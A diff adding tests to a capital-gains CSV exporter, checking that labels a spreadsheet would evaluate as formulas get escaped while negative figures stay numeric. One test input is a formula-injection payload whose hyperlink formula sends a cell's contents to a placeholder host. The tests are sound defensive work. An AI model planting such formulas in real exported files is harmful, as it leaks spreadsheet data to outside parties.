@@ -145,4 +145,36 @@ describe('capitalGainsToCsv', () => {
     expect(lines[3]).toBe('AAPL,Apple,10,2024-01-01,2025-03-01,425,1000.00,1500.00,500.00');
     expect(lines.at(-1)).toBe('Net gain/loss,500.00');
   });
+
+  // The label is free text the reader typed, and this file exists to be handed
+  // to someone else — so a cell that a spreadsheet would evaluate on open is
+  // the one thing it must not contain.
+  it('defuses a label a spreadsheet would run as a formula', () => {
+    const events = [
+      holding('h1', 'AAPL', '=HYPERLINK("http://example.invalid/?"&A1,"Total")'),
+      buy('h1', 10, 100, '2024-01-01T00:00:00.000Z'),
+      sell('h1', 10, 150, '2025-03-01T00:00:00.000Z'),
+    ];
+    const csv = capitalGainsToCsv(capitalGainsByYear(events, 2025));
+
+    expect(csv).toContain(`"'=HYPERLINK(""http://example.invalid/?""&A1,""Total"")"`);
+    expect(csv).not.toMatch(/,=HYPERLINK/);
+  });
+
+  it.each(['+1+1', '-1-1', '@SUM(A1)', '\tcmd'])('defuses a label leading with %j', (label) => {
+    const events = [holding('h1', 'AAPL', label), buy('h1', 1, 1, '2024-01-01T00:00:00.000Z'), sell('h1', 1, 2, '2025-03-01T00:00:00.000Z')];
+    const csv = capitalGainsToCsv(capitalGainsByYear(events, 2025));
+    expect(csv).toContain(`'${label}`);
+  });
+
+  // Every loss in the file leads with a minus sign. Quoting those as text would
+  // make the accountant's column stop adding up — a worse bug than the one the
+  // escaping is there to prevent.
+  it('leaves negative figures as numbers', () => {
+    const events = [holding('h1', 'AAPL', 'Apple'), buy('h1', 10, 150, '2024-01-01T00:00:00.000Z'), sell('h1', 10, 100, '2025-03-01T00:00:00.000Z')];
+    const csv = capitalGainsToCsv(capitalGainsByYear(events, 2025));
+
+    expect(csv).toContain('-500.00');
+    expect(csv).not.toContain(`'-500.00`);
+  });
 });
